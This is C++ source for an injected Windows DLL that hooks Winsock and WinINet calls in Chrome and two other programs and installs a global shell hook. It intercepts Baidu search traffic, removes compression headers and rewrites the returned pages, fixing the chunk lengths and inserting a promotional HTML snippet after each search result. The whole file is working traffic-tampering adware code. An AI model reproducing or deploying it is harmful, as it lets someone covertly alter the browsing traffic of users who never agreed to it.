// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#include "detours.h"
#include "Log.h"
#include <WinInet.h>
#include <WinSock2.h>
#include <string>
#include <map>
#include <atlstr.h>



#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
HHOOK  g_Key = NULL;
HMODULE g_Hmodule = NULL;
CStringA strInsert;
std::map<SOCKET, int>  mSocks;
std::map<SOCKET, CStringA*>  mHtml;
std::map<SOCKET, int>  mRead;
bool  bHook = false;
char szLogFile[MAX_PATH] = {0};

HANDLE hMutex;

BOOL WINAPI SetKeyHook ( BOOL isInstall ) ;
CStringA GetDecryUrl( const CStringA &strUrl );
CStringA GetUrlFormContent(const CStringA &strPage );

CStringA CharactAddNumber(const CStringA &str, int iNum)
{
	int iFact = strtol(str.GetString(), NULL, 16);
	iFact += iNum;

	CStringA strReturn;
	char szNum[20] = {0};

	strReturn = _itoa(iFact, szNum, 16);

	return strReturn;
}

bool  Check(const char *pNum, int iLen)
{
	if (pNum != NULL)
	{
		for(int i=0; i<iLen; i++)
		{
			if (!(((*(pNum+i)) >= '0' && (*(pNum+i)) <= '9')
				|| ((*(pNum+i)) >= 'a' && (*(pNum+i)) <= 'f')
				|| ((*(pNum+i)) >= 'A' && (*(pNum+i)) <= 'F')))
				return false;
		}
	}
	else
	{
		return false;
	}

	return true;
}


CStringA GetNumerPos(CStringA str, int &iPos1, int &iPos2)
{
	iPos1 = iPos2 = -1;
	const int iChaJu = 10;

	CStringA strR;

	int iPos3 = str.ReverseFind('\n');

	if (iPos3 != -1)
	{
		int i = iPos3 -1;

		while(i > 0)
		{
			if (i < (iPos3-iChaJu))
			{
				str = str.Left(iPos3-1);

				iPos3 = str.ReverseFind('\n');
				if (iPos3 == -1)
					break;

				i = iPos3 - 1;
			}

			if ((str.GetAt(i) == '\n' && str.GetAt(i-1) == '\r')
				|| i == 1)
			{
				if (i == 1)
				{
					iPos1 = 0;
				}
				else
				{
					iPos1 = i+1;
				}
				
				iPos2 = iPos3-1;

				if (iPos1 != -1 && iPos2 != -1)
				{
					strR = str.Mid(iPos1, iPos2-iPos1);
				}

				if (strR.IsEmpty() || !Check(strR.GetString(), strR.GetLength()))
				{
					str = str.Left(iPos3-1);
					iPos3 = str.ReverseFind('\n');

					if (iPos3 == -1)
						break;
				}
				else
				{
					break;
				}				
			}

			i--;
		}
	}

	return strR;

}

void HandleHtmlBuf(CStringA *pBuf)
{
	int iPos = 0;
	int i = 0, j = 0, k = 0;
	while(true)
	{
		iPos = pBuf->Find(" c-container", iPos);

		if (iPos != -1)
		{
			i++;
			int iPos2 = pBuf->Find("a>",iPos+1);

			if (iPos2 != -1)
			{
				j++;
				CStringA strEnery = /*GetUrlFormContent(pBuf->Mid(iPos, iPos2-iPos))*/"sdafsd";
				CStringA strUlr = /*GetDecryUrl(strEnery)*/"sdfasd";
				CStringA strTmp = pBuf->Left(iPos2);

				iPos2 += 2;
				iPos = iPos2;
				
				if (!strUlr.IsEmpty())
				{
					int iTmp1,iTmp2;
					CStringA strNum = GetNumerPos(strTmp, iTmp1, iTmp2);


					if (strNum.IsEmpty())
					{
						char *pTmp = "\r\nGetNumerPos  为空\r\n";
						write_log_file(szLogFile, FILE_MAX_SIZE, pTmp, strlen(pTmp));

						write_log_file(szLogFile, FILE_MAX_SIZE, strTmp.GetString(), strTmp.GetLength());
					}

					if (!strNum.IsEmpty() && iTmp1 != -1 && iTmp2 != -1)
					{
						CStringA strReturn = CharactAddNumber(strNum, strInsert.GetLength());;

						if (strReturn.GetLength() > 0 && strReturn.GetLength() == strNum.GetLength())
						{
							k++;
							int iCurrent1 = iTmp1;
							int iCurrent2 = 0;
							while(iCurrent1 <iTmp2)
							{
								pBuf->SetAt(iCurrent1, strReturn.GetAt(iCurrent2));

								iCurrent1++;
								iCurrent2++;
							}
							pBuf->Insert(iPos2, strInsert);
						}
						else if (strReturn.GetLength() > 0 && strReturn.GetLength() == (strNum.GetLength()+1))
						{
							k++;
							int iCurrent1 = iTmp1;
							int iCurrent2 = 0;

							pBuf->Insert(iCurrent1+1, ' ');
							iPos2++;   //因为数据相加导致数字进位多个字符，要空出个字符出来
							iTmp2++;

							while(iCurrent1 <iTmp2)
							{
								pBuf->SetAt(iCurrent1, strReturn.GetAt(iCurrent2));

								iCurrent1++;
								iCurrent2++;
							}
							pBuf->Insert(iPos2, strInsert);

							char *pTmp = "\r\n包长度相加进位\r\n";
							write_log_file(szLogFile, FILE_MAX_SIZE, pTmp, strlen(pTmp));

							write_log_file(szLogFile, FILE_MAX_SIZE, strReturn, strReturn.GetLength());
							write_log_file(szLogFile, FILE_MAX_SIZE, strNum, strNum.GetLength());
							write_log_file(szLogFile, FILE_MAX_SIZE, "\r\n", 2);
							
						}
					}
				}
				else
				{
					char *pTmp = "\r\n破解失败\r\n";
					write_log_file(szLogFile, FILE_MAX_SIZE, pTmp, strlen(pTmp));
					write_log_file(szLogFile, FILE_MAX_SIZE, strEnery.GetString(), strEnery.GetLength());
				}
			}
			else
			{
				OutputDebugStringA("find /a> failed\r\n");
				iPos += 3;
				break;
			}
		}
		else
		{
			break;
		}
	}

	if (pBuf->GetLength() > 1000)
	{
		char szTmp[40] = {0};

		sprintf(szTmp, "\r\n\r\ni: %d  j:%d  k:%d \r\n", i, j, k);
		write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));
	}

	/*pTmp = "\r\n处理html结束\r\n";
	write_log_file(szLogFile, FILE_MAX_SIZE, pBuf->GetString(), pBuf->GetLength());*/
}


char * WideToMulti( const wchar_t *pWide , DWORD dwCode = CP_ACP )
{
	char *pChar = NULL;
	int  iWlen = 0;

	if (pWide == NULL
		|| (iWlen = wcslen(pWide)) == 0)
	{
		return pChar;
	}

	int iLen = WideCharToMultiByte( dwCode, 0, pWide, iWlen, NULL, NULL, NULL, NULL );
	if (iLen > 0)
	{
		pChar = new char[iLen + 1];
		if (pChar != NULL)
		{
			memset(pChar, 0, iLen+1);
			WideCharToMultiByte( dwCode, 0, pWide, iWlen, pChar, iLen, NULL, NULL );
		}
	}

	return pChar;
}

wchar_t * MultitoWide( const char *pMulti, DWORD dwCode = CP_ACP )
{
	wchar_t *pWide = NULL;
	int iAlen = 0;

	if (pMulti == NULL
		|| (iAlen = strlen(pMulti)) == 0)
	{
		return pWide;
	}

	int iLen = MultiByteToWideChar( dwCode, 0, pMulti, iAlen, NULL, NULL );
	if (iLen > 0)
	{
		pWide = new wchar_t[iLen + 1];
		if (pWide != NULL)
		{
			memset(pWide, 0, (iLen+1)*sizeof(wchar_t));
			MultiByteToWideChar( dwCode, 0, pMulti, iAlen, pWide, iLen );
		}

	}

	return pWide;
}


static int (WSAAPI *Old_WSASend)(
	__in          SOCKET s,
	__in          LPWSABUF lpBuffers,
	__in          DWORD dwBufferCount,
	__out         LPDWORD lpNumberOfBytesSent,
	__in          DWORD dwFlags,
	__in          LPWSAOVERLAPPED lpOverlapped,
	__in          LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	) = WSASend;

int WSAAPI New_WSASend(
	__in          SOCKET s,
	__in          LPWSABUF lpBuffers,
	__in          DWORD dwBufferCount,
	__out         LPDWORD lpNumberOfBytesSent,
	__in          DWORD dwFlags,
	__in          LPWSAOVERLAPPED lpOverlapped,
	__in          LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	)
{
	if (dwFlags == 0)
	{

		CStringA  str = lpBuffers->buf;
		if (str.Find("Host: www.baidu.com") != -1)
		{
			int iPos = str.Find("\r\n");
			CStringA strTmp = str.Mid(0, iPos);

			if ((strTmp.Find("wd=&") == -1 && strTmp.Find("wd=") != -1)
				|| (strTmp.Find("word=&") == -1 && strTmp.Find("word=") != -1))
			{
				int iPos1 = str.Find("Accept-Encoding:");
				if (iPos1 != -1)
				{
					int iPos2 = str.Find("\r\n", iPos1);

					if (iPos2 != -1)
					{
						str.Replace(str.Mid(iPos1, iPos2-iPos1+2), "");
					}
				}

				memset(lpBuffers->buf, 0, lpBuffers->len);
				memcpy(lpBuffers->buf, str.GetString(), str.GetLength());
				lpBuffers->len = str.GetLength();
				*lpNumberOfBytesSent = str.GetLength();
				
				//WaitForSingleObject(hMutex, 2000);
		
				if (mHtml[s] == NULL)
				{

					mSocks[s] = 0;
					mHtml[s] = new CStringA();

				}
				else
				{
					mSocks[s] = 0;
					OutputDebugStringA("\r\nsocket repeat\r\n");
				}			

				//ReleaseMutex(hMutex);

				char szTmp[50] = {0};
				sprintf(szTmp, "socket : %d\r\n", s);

				write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));
				
				
			}
			else
			{
				/*if (lpBuffers->len > 0 && lpBuffers->len < 10000)
				{
					write_log_file(szLogFile, FILE_MAX_SIZE, "\r\n", 2);
					write_log_file(szLogFile, FILE_MAX_SIZE, lpBuffers->buf, lpBuffers->len);
					write_log_file(szLogFile, FILE_MAX_SIZE, "\r\n", 2);
				}*/
				
			}
		}
		else
		{
			/*if (lpBuffers->len > 0 && lpBuffers->len < 10000)
			{
				write_log_file(szLogFile, FILE_MAX_SIZE, "\r\n", 2);
				write_log_file(szLogFile, FILE_MAX_SIZE, lpBuffers->buf, lpBuffers->len);
				write_log_file(szLogFile, FILE_MAX_SIZE, "\r\n", 2);
			}*/		

		}

	/*	if (lpBuffers->len > 0 && lpBuffers->len < 10000)
			write_log_file(szLogFile, FILE_MAX_SIZE, lpBuffers->buf, lpBuffers->len);*/
	}
	
	

	return Old_WSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}




static int (WSAAPI *Old_send)(
	__in          SOCKET s,
	__in          const char* buf,
	__in          int len,
	__in          int flags
	) = send;

int WSAAPI New_send(
	__in          SOCKET s,
	__in          const char* buf,
	__in          int len,
	__in          int flags
	)
{
	CStringA  str = buf;
	if (flags == 0)
	{
		if (str.Find("Host: www.baidu.com") != -1)
		{
			int iPos = str.Find("\r\n");
			CStringA strTmp = str.Mid(0, iPos);

			if ((strTmp.Find("wd=&") == -1 && strTmp.Find("wd=") != -1)
				|| (strTmp.Find("word=&") == -1 && strTmp.Find("word=") != -1))
			{
				//str.Replace("Accept-Encoding: gzip, deflate, sdch\r\n", "");
				int iPos1 = str.Find("Accept-Encoding:");
				if (iPos1 != -1)
				{
					int iPos2 = str.Find("\r\n", iPos1);

					if (iPos2 != -1)
					{
						str.Replace(str.Mid(iPos1, iPos2-iPos1+2), "");
					}
				}

				OutputDebugStringA(str.GetString());

				mSocks[s] = 0;
				mHtml[s] = new CStringA();
			}		
		}
	}

	return Old_send(s, str.GetString(), str.GetLength(), flags);
}


static int (WSAAPI *Old_recv)(
	__in          SOCKET s,
	__out         char* buf,
	__in          int len,
	__in          int flags
	) = recv;

int WSAAPI New_recv(
	__in          SOCKET s,
	__out         char* buf,
	__in          int len,
	__in          int flags
	)
{
	//int iRead = 0;
	//if (flags == 0)
	//{
	//	int iNewLen = len;

	//	std::map<SOCKET,int>::iterator iter;
	//	iter = mSocks.find(s);

	//	if (iter != mSocks.end())
	//	{
	//		if (iNewLen > 4096)
	//		{
	//			iNewLen -= (strInsert.GetLength()*10);
	//		}
	//	}

	//	iRead = Old_recv(s, buf, iNewLen, flags);
	//	
	//	if (iter != mSocks.end() && iRead > 0 && len>4096)
	//	{
	//		//WaitForSingleObject(hMutex, INFINITE);
	//		CStringA strBuf;

	//		strBuf.GetBuffer(iRead + 1);
	//		memcpy(strBuf.GetBuffer(0), buf, iRead);
	//		strBuf.ReleaseBuffer(iRead);

	//		int iPos = 0;

	//		while(true)
	//		{
	//			iPos = strBuf.Find("result c-container", iPos);

	//			if (iPos != -1)
	//			{
	//				int iPos2 = strBuf.Find("/a>",iPos+1);

	//				
	//				if (iPos2 != -1)
	//				{
	//					iPos2 += 3;
	//					iPos = iPos2;
	//					
	//					CStringA strTmp = strBuf.Left(iPos2);
	//						
	//					int iTmp1,iTmp2;
	//					CStringA strNum = GetNumerPos(strTmp, iTmp1, iTmp2);

	//					if (!strNum.IsEmpty())
	//					{
	//						CStringA strReturn = CharactAddNumber(strNum, strInsert.GetLength());;

	//						strReturn.Insert(0, '\n');
	//						strNum.Insert(0, '\n');

	//						strBuf.Replace(strNum,strReturn);
	//						strBuf.Insert(iPos2, strInsert);
	//						memset(buf,0, len);
	//						memcpy(buf, strBuf.GetString(), strBuf.GetLength());
	//					}

	//					iRead = strBuf.GetLength();

	//					/*memset(pTmpBuf, 0, len);
	//					memcpy(pTmpBuf, buf, iRead);
	//					memset(buf,0, len);
	//					memcpy(buf, pTmpBuf, iRead);*/
	//				}
	//				else
	//				{
	//					break;
	//				}
	//			}
	//			else
	//			{
	//				break;
	//			}
	//		}
	//		//ReleaseMutex(hMutex);
	//	}
	//}
	//else
	//{
	//	iRead =  Old_recv(s, buf, len, flags);
	//}
	//

	//return iRead;

	std::map<SOCKET,int>::iterator iterS = mSocks.find(s);
	std::map<SOCKET,CStringA*>::iterator iterH = mHtml.find(s);
	BOOL bTrue = FALSE;

	int iRead = 0;
	if (flags == 0 && iterS != mSocks.end())
	{
		bTrue = TRUE;
		CStringA *pBuf = NULL;

		if (iterH != mHtml.end())
			pBuf = iterH->second;

		//WaitForSingleObject(hMutex, 2000);
		
		
		if (iterS->second == 0)
		{
			iRead = Old_recv(s, buf, len, flags);
			if (iRead > 0 && pBuf != NULL)
			{
				pBuf->Empty();
				iterS->second++;

				pBuf->GetBuffer(iRead + 1);
				memcpy(pBuf->GetBuffer(0), buf, iRead);
				pBuf->ReleaseBuffer(iRead);

				int iPos1 = pBuf->Find("\r\n\r\n");
				if (iPos1 == -1)
				{
					iPos1 = 0;
				}
				else
				{
					iPos1 += 4;
				}
			

				*pBuf = pBuf->Right(iRead - iPos1);

				memset(buf+iPos1, 0, len-iPos1);
				iRead = iPos1;



				write_log_file(szLogFile, FILE_MAX_SIZE, buf, iRead);

				int iNewRead = 0;
				int iRetrys = 0;
				char szBuf[32768+1];

				DWORD dwTotal = 0;
				
				while(true)
				{
					memset(szBuf, 0, 32768+1);
					iNewRead = Old_recv(s, szBuf, 32768, flags);

					if (iNewRead <= 0)
					{
						if (pBuf->Find("/html>") != -1 || pBuf->Find("0\r\n\r\n") != -1)
						{
							break;
						}

						if (iRetrys++ > 10)
						{
							OutputDebugStringA("\r\n提取抓取数据失败, 改正常抓取数据\r\n");
							break;
						}
						else
						{
							OutputDebugStringA("\r\n抓取数据失败，重试..\r\n");
						}
					}
					else
					{
						dwTotal += iNewRead;
						pBuf->Append(szBuf, iNewRead);
					}

					Sleep(10);

				}
				DWORD dwOld =  pBuf->GetLength();
				DWORD dwTime = GetTickCount();
				HandleHtmlBuf(pBuf);
				mRead[s] = 0;

				dwTime = GetTickCount() - dwTime;

				char szTmp[40] = {0};

				sprintf(szTmp, "\r\n\r\ntime: %d   p:%d  b:%d \r\n", dwTime, dwOld, dwTotal);
				write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));
			}
		}
		else if ( iterS->second == 1 && pBuf != NULL && pBuf->GetLength() > 0 && len > 0)
		{
			if ((pBuf->GetLength() - mRead[s]) < len)
			{
				iRead = pBuf->GetLength() - mRead[s];
				memcpy(buf, pBuf->GetString() + mRead[s], iRead);

				pBuf->Empty();
				iterS->second = 0;
				mRead[s] = 0;

				char szTmp[40] = {0};

				sprintf(szTmp, "\r\n\r\end: %d  %d s:%d\r\n", iRead, len, s);
				write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));
	
				
			}
			else
			{
				char szTmp[40] = {0};
				iRead = len;
				while(iRead > 0)
				{
					if ((*(pBuf->GetString() + mRead[s] + iRead -1) < 0x20)
						|| (*(pBuf->GetString() + mRead[s] + iRead -1) > 0x7e))
					{
						iRead--;

						sprintf(szTmp, "\r\n\r\zhong wen \r\n");
						write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));
						//break;
					}
					else
					{
						break;
					}
				}
				
				memcpy(buf, pBuf->GetString() + mRead[s], iRead);
				mRead[s] += iRead;

				//*pBuf = pBuf->Right(pBuf->GetLength()-iRead);


				

				sprintf(szTmp, "\r\n\r\once:%d   %d   s:%d\r\n", iRead, len, s);
				write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));
			}
		}
		else
		{
			iRead =  Old_recv(s, buf, len, flags);
		}

		//ReleaseMutex(hMutex);		
	}
	else
	{
		iRead =  Old_recv(s, buf, len, flags);
	}
	

	/*if (bTrue && iRead > 0)
	{
		char szTmp[50] = {0};
		sprintf(szTmp, "socket recv: %d\r\n", s);

		write_log_file(szLogFile, FILE_MAX_SIZE, szTmp, strlen(szTmp));

		write_log_file(szLogFile, FILE_MAX_SIZE, buf, iRead);
	}*/
	return iRead;
}


static int (WSAAPI *Old_WSARecv)(
	__in          SOCKET s,
	      LPWSABUF lpBuffers,
	__in          DWORD dwBufferCount,
	__out         LPDWORD lpNumberOfBytesRecvd,
	      LPDWORD lpFlags,
	__in          LPWSAOVERLAPPED lpOverlapped,
	__in          LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	) = WSARecv;


int WSAAPI New_WSARecv(
	__in          SOCKET s,
	      LPWSABUF lpBuffers,
	__in          DWORD dwBufferCount,
	__out         LPDWORD lpNumberOfBytesRecvd,
	      LPDWORD lpFlags,
	__in          LPWSAOVERLAPPED lpOverlapped,
	__in          LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	)
{
	//std::map<SOCKET,int>::iterator iterS = mSocks.find(s);
	//std::map<SOCKET,CStringA*>::iterator iterH = mHtml.find(s);

	//int iRead = 0;
	//if ((*lpFlags)) == 0 && iterS != mSocks.end())
	//{
	//	WaitForSingleObject(hMutex, 5000);

	//	CStringA *pBuf = NULL;

	//	if (iterH != mHtml.end())
	//		pBuf = iterH->second;

	//	if (iterS != mSocks.end() && (iterS->second == 0))
	//	{
	//		iRead = Old_WSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);
	//		if (iRead > 0 && pBuf != NULL)
	//		{
	//			iterS->second++;

	//			pBuf->GetBuffer(iRead + 1);
	//			memcpy(pBuf->GetBuffer(0), lpBuffers->buf, iRead);
	//			pBuf->ReleaseBuffer(iRead);

	//			int iPos1 = pBuf->Find("\r\n\r\n");
	//			if (iPos1 != -1)
	//			{
	//				iPos1 = pBuf->Find("\r\n", iPos1+4);
	//				if (iPos1 != -1)
	//				{
	//					iPos1 += 2;
	//				}
	//				else
	//				{
	//					iPos1 = pBuf->Find("\r\n\r\n");
	//					iPos1 += 4;
	//				}
	//			}
	//			

	//			*pBuf = pBuf->Right(iRead - iPos1);

	//			memset(lpBuffers->buf + iPos1, 0, len-iPos1);
	//			iRead = iPos1;

	//			int iNewRead = 0;
	//			int iRetrys = 0;
	//			char szBuf[32768+1];
	//			while(true)
	//			{
	//				memset(szBuf, 0, 32768+1);
	//				iNewRead = Old_recv(s, szBuf, 32768, flags);

	//				if (iNewRead <= 0)
	//				{
	//					if (pBuf->Find("/html>") != -1 || pBuf->Find("0\r\n\r\n") != -1)
	//					{
	//						break;
	//					}

	//					if (iRetrys++ > 5)
	//					{
	//						OutputDebugStringA("\r\n提取抓取数据失败, 改正常抓取数据\r\n");
	//						break;
	//					}
	//				}
	//				else
	//				{
	//					pBuf->Append(szBuf);
	//				}
	//				Sleep(10);
	//			}

	//			HandleHtmlBuf(pBuf);
	//		}
	//	}
	//	else if (iterS != mSocks.end() && /*len == 32768*/(iterS->second == 1) && pBuf != NULL)
	//	{
	//		/*if (pBuf->IsEmpty())
	//		{
	//		mSocks.erase(iterS);
	//		mHtml.erase(iterH);
	//		delete pBuf;

	//		iRead =  Old_recv(s, buf, len, flags);

	//		if (iRead > 0 && iRead < (len-2))
	//		*(buf+iRead+1) = '\0';

	//		OutputDebugStringA("\r\n====================end\r\n");
	//		OutputDebugStringA(buf);
	//		OutputDebugStringA("\r\n====================end\r\n");

	//		}
	//		else */if (pBuf->GetLength() < len)
	//		{
	//			iRead = pBuf->GetLength();
	//			memcpy(buf, pBuf->GetString(), pBuf->GetLength());


	//			OutputDebugStringA("\r\n===================last\r\n");
	//			OutputDebugStringA(pBuf->Right(20));
	//			OutputDebugStringA("\r\n===================last\r\n");

	//			mSocks.erase(iterS);
	//			mHtml.erase(iterH);
	//			delete pBuf;
	//		}
	//		else
	//		{
	//			iRead = len;
	//			memcpy(buf, pBuf->GetString(), len);

	//			*pBuf = pBuf->Right(pBuf->GetLength()-len);

	//		}
	//		//Sleep(20);
	//	}
	//	else
	//	{
	//		iRead =  Old_WSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);
	//	}

	//	ReleaseMutex(hMutex);
	//}
	//else
	//{
	//	iRead =  Old_WSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);
	//}

	
	return Old_WSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);
}



//
//static int (WINAPI *Old_Recv)(SOCKET s, char* buf, int len, int flags) = recv;
//
//
//int WINAPI New_Recv(SOCKET s, char* buf, int len, int flags)
//{
//
//	return Old_Recv(s, buf, len, flags);
//}


static BOOL (__stdcall *Old_InternetReadFile)(HINTERNET hFile,LPVOID lpBuffer,DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) = InternetReadFile;


BOOL __stdcall New_InternetReadFile(
	__in          HINTERNET hFile,
	__out         LPVOID lpBuffer,
	__in          DWORD dwNumberOfBytesToRead,
	__out         LPDWORD lpdwNumberOfBytesRead
	)
{
	return Old_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}




void  SetHook()
{
	long lValue = 0;
	lValue = DetourTransactionBegin();  
	lValue = DetourUpdateThread(GetCurrentThread());  
	lValue = DetourAttach(&(PVOID&)Old_InternetReadFile, New_InternetReadFile); 
	lValue = DetourAttach(&(PVOID&)Old_recv, New_recv);  
	lValue = DetourAttach(&(PVOID&)Old_WSARecv, New_WSARecv);  
	lValue = DetourAttach(&(PVOID&)Old_send, New_send);  
	lValue = DetourAttach(&(PVOID&)Old_WSASend, New_WSASend);  
	lValue = DetourTransactionCommit();  
}
void  UnHook()
{
	DetourTransactionBegin();  
	DetourUpdateThread(GetCurrentThread());  
	DetourDetach(&(PVOID&)Old_InternetReadFile, New_InternetReadFile);  
	DetourDetach(&(PVOID&)Old_recv, New_recv);  
	DetourDetach(&(PVOID&)Old_WSARecv, New_WSARecv);  
	DetourDetach(&(PVOID&)Old_send, New_send);  
	DetourDetach(&(PVOID&)Old_WSASend, New_WSASend);  
	DetourTransactionCommit();  
}






//shell钩子消息处理过程
LRESULT CALLBACK KeyBoardProc ( int nCode, WPARAM wParam, LPARAM lParam )
{
	// 继续传递消息
	return CallNextHookEx ( g_Key, nCode, wParam, lParam ) ;
}


BOOL WINAPI SetKeyHook ( BOOL isInstall ) 
{
	// 需要安装，且钩子不存在
	if ( isInstall && !g_Key )
	{
		// 设置全局钩子
		g_Key = SetWindowsHookEx (  WH_SHELL /*WH_KEYBOARD*/, (HOOKPROC)KeyBoardProc, g_Hmodule, 0 ) ;
		if ( g_Key == NULL )
		{
			return FALSE ;
		}
	}

	// 需要卸载，且钩子存在
	if ( !isInstall && g_Key )
	{
		// 卸载钩子
		BOOL ret = UnhookWindowsHookEx ( g_Key ) ;
		g_Key	= NULL ;
		return ret ;
	}

	return TRUE ;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			GetModuleFileNameA(NULL, szLogFile, MAX_PATH);
			CStringA exePath = PathFindFileNameA(szLogFile);
			
			if (exePath.CompareNoCase("chrome.exe") == 0 || exePath.CompareNoCase("ExeTest.exe") == 0
				|| exePath.CompareNoCase("NetPiao.exe") == 0)
				bHook = true;


			PathAppendA(szLogFile, "..\\");
			PathAppendA(szLogFile, "cDebug.log");


			if (bHook)
			{
				g_Hmodule = hModule;
				//DisableThreadLibraryCalls(hModule);

				

				char *pA = WideToMulti(L"  <p>舟大师推广</p>  ", CP_UTF8);
				if (pA != NULL)
				{
					strInsert = pA;
					delete []pA;
				}

				hMutex = CreateMutex(NULL, FALSE, NULL);

				if (exePath.CompareNoCase("ExeTest.exe") == 0)
					SetKeyHook(TRUE);

				SetHook();
			}
			
		}
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		{
			if(bHook)
			{
				mSocks.clear();
				mHtml.clear();
				UnHook();
				SetKeyHook(FALSE);

				CloseHandle(hMutex);
			}
			

			
		}
		break;
	}
	return TRUE;
}



CStringA GetDecryUrl( const CStringA &strUrl )
{
	CStringA varMsg;
	HINTERNET hOpen;
	HINTERNET hConnect;
	HINTERNET hRequest;


	int nState = strUrl.Find(".com");

	if (nState != -1)
	{
		CStringA  strObjectName = strUrl.Mid(nState+4);   // 获取对象(文件)地址
		CStringA strHost = strUrl.Left(nState+4);

		if((nState=strHost.Find("://")) != -1)
			strHost = strHost.Right(strHost.GetLength()-nState-3);
		
	
		hOpen = InternetOpenA("DECRY_URL", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	
		if (hOpen)
		{
			// 创建一个指定的连接，它将通过传递给它的参数为指定的站点初始化HTTP、FTP连接
			hConnect = InternetConnectA(hOpen
				, strHost
				, 80
				, NULL
				, NULL
				, INTERNET_SERVICE_HTTP
				, 0
				, 0 );

			if (hConnect)
			{
				DWORD dwFlags = 
				INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_RAW_DATA|INTERNET_FLAG_RELOAD|        
				INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_PRAGMA_NOCACHE; 
				// 创建一个HTTP请求
				hRequest = HttpOpenRequestA(hConnect, NULL, strObjectName, NULL, NULL, NULL, dwFlags,  NULL);
				if ( hRequest )
				{
					CStringA strHeaders("Accept: */*\r\nContent-Type: application/x-www-form-urlencoded");
					// 说白了就是给hRequest添加发送前所需的头
					HttpAddRequestHeadersA(hRequest, strHeaders.GetString(), strHeaders.GetLength(), HTTP_ADDREQ_FLAG_ADD);
				
					// INTERNET_OPTION_SEND_TIMEOUT 设置，发送请求和连接时的超时时间
					// INTERNET_OPTION_RECEIVE_TIMEOUT 设置，接收请求和连接时的超时时间
					unsigned long lms = 15*1000;
					InternetSetOptionA(hOpen, INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT, &lms, sizeof(lms));
					InternetSetOptionA(hOpen, INTERNET_OPTION_SEND_TIMEOUT, &lms, sizeof(lms));


					if ( HttpSendRequestA(hRequest, NULL, 0, NULL, 0) )
					{
						//GetStatusCode(hRequest);
						char szBuffer[INTERNET_MAX_URL_LENGTH] = {0};
						DWORD dwLen = sizeof(szBuffer);
						// 获取HTTP请求信息（HTTP_QUERY_LOCATION获取的绝对URL在Location应答头）
						HttpQueryInfoA(hRequest, HTTP_QUERY_LOCATION, szBuffer, &dwLen, NULL);
						varMsg = szBuffer;
				
					}
					else
					{
						nState = GetLastError();
					}

					//HttpEndRequestA(hRequest, NULL, NULL, NULL);
					InternetCloseHandle(hRequest);
				}
				InternetCloseHandle(hConnect);
			
			}		
			InternetCloseHandle(hOpen);
		}
	}

	if (varMsg.IsEmpty())
	{
		OutputDebugStringA("\r\n网址提取失败:");
		OutputDebugStringA(strUrl.GetString());
		OutputDebugStringA("\r\n");
	}

	return varMsg;
}


/*
	@brief  根据百度条目html源码取得对应链接url
	@param  strPage  源码
	*/
CStringA GetUrlFormContent(const CStringA &strPage )
{
	CStringA strUrl;
	int iPos1 = strPage.Find("href=");
	int iPos2 = -1;

	if (iPos1 == -1)
	{
		iPos1 = strPage.Find("href = ");
		if (iPos1 != -1)
			iPos1 += 2;
	}

	if (iPos1 != -1)
	{
		iPos2 = strPage.Find('\"', iPos1 + 6);  //加6  href="  包含6个字符
		if (iPos2 != -1 && iPos2 > iPos1+6)
		{
			strUrl = strPage.Mid(iPos1 + 6, iPos2-iPos1-6);
		}
	}

	if (strUrl.IsEmpty())
	{
		OutputDebugStringA("find url is empty\r\n");
	}

	return strUrl;
}